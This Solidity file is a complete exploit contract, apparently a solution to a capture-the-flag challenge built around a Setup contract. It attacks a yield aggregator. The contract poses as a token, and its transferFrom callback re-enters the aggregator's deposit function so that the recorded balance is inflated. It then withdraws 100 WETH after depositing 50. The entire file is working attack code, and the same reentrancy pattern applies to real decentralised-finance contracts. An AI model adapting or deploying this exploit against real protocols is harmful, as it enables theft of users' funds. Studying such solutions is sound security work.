pragma solidity ^0.8.0;

import "public/Setup.sol";

contract Exploit {
    Setup setup;
    YieldAggregator aggregator;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Protocol protocol;


    constructor(Setup _setup) payable {
        require(msg.value == 50 ether);
        setup = _setup;
        aggregator = setup.aggregator();
        protocol = Protocol(address(setup.bank()));
        // fund our wallet
        weth.deposit{value: msg.value}();
        weth.approve(address(aggregator), type(uint256).max);
        weth.approve(address(protocol), type(uint256).max);
    }

    function go() public {
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(this);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 1;
        aggregator.deposit(protocol, _tokens, _amounts);

        _tokens[0] = address(weth);
        _amounts[0] = 100 ether;
        aggregator.withdraw(protocol, _tokens, _amounts);
    }

    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) external returns (bool) {
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;
        aggregator.deposit(protocol, _tokens, _amounts);
    }

    function approve(
        address dst,
        uint256 qty
    ) external returns (bool) {
        return true;
    }

    function balanceUnderlying() public view returns (uint256) {
        return 0;
    }
}
